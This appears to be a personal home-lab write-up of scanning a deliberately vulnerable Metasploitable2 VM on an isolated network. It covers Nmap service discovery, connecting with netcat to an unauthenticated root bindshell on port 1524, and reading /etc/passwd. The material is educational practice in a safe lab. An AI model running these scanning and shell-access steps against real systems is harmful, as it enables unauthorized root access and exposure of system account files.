Home Lab: Reconnaissance and Exploitation with Metasploitable2

Date: September 29, 2026 Tools: Kali Linux, Metasploitable2, UTM (virtualization), Nmap, Netcat

Objective

Build an isolated lab with an intentionally vulnerable machine, to practice network reconnaissance and basic exploitation in a safe, legal environment.

Environment setup
Downloaded the official Metasploitable2 image (Rapid7 project, via SourceForge)
Converted the disk from .vmdk to .qcow2 using qemu-img convert -f vmdk -O qcow2
Created the VM in UTM with emulated x86_64 architecture (my Mac runs ARM)
Disabled UEFI boot in the QEMU settings — this image needs classic BIOS/Legacy boot
Configured the network in "Host Only" mode, isolated from my real Wi-Fi with no internet access
Created a dedicated Kali copy ("Kali LAB"), also in "Host Only" mode, separate from my regular Kali
Confirmed connectivity between both machines with ping: 0% packet loss
Reconnaissance with Nmap

First attempt:

nmap -sV 192.168.128.3

It hung for over 5 minutes during the ARP Ping Scan phase, with no progress.

Root cause: on an isolated "Host Only" network with no DNS, Nmap waits indefinitely for a DNS resolution that never arrives.

Fix:

nmap -sV -Pn -n -T4 192.168.128.3
-Pn → skip host discovery (treat host as alive)
-n → skip DNS resolution
-T4 → faster scan timing

Scan completed in 52.70 seconds. Relevant services found:

Port	Service	Detail
1524/tcp	bindshell	"Metasploitable root shell" — unauthenticated root access
2121/tcp	ftp	ProFTPD 1.3.1
3306/tcp	mysql	MySQL 5.0.51a
5432/tcp	postgresql	PostgreSQL 8.3
5900/tcp	vnc	VNC (protocol 3.3)
6667/tcp	irc	UnrealIRCd
8180/tcp	http	Apache Tomcat/Coyote
Exploiting the bindshell (port 1524)
nc 192.168.128.3 1524
whoami

Result: root — full administrator access, with no username or password, just by connecting to the port.

Basic system reconnaissance once inside:

cat /etc/passwd

Confirmed the system's user list (root with ID 0, msfadmin with ID 1000, and a test user called "user").

Lessons learned
An unauthenticated service is one of the most severe vulnerabilities that exists: no "hacking" required, just connecting is enough
By default, nmap -sV attempts an ARP Ping Scan and DNS resolution before scanning; on isolated networks with no DNS, this can hang the scan indefinitely
Keeping a dedicated Kali copy for the lab avoids losing internet access on the daily-use machine
Before assuming a VM has frozen, it's worth checking whether it's just the screensaver
